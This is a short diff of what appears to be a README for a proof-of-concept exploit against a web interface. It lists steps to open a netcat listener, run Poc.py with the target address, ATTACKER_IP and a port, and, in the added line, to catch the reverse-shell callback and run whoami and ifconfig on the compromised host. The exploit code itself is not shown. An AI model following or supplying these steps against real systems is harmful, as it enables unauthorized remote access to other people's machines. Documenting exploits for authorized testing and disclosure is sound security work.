@@ -34,3 +34,4 @@
     run command: `nc -lvnp 63842`
 3. run python:
     `python Poc.py https://<TARGET_PAL_WEB_INTERFACE_IP> <ATTACKER_IP> <ATTACKER_PORT>` # Random high port chosen in script from above
+4. once exploit is through, look at initial listener and wait for callback to catch. once callback catches perform; `whoami`, `ifconfig`
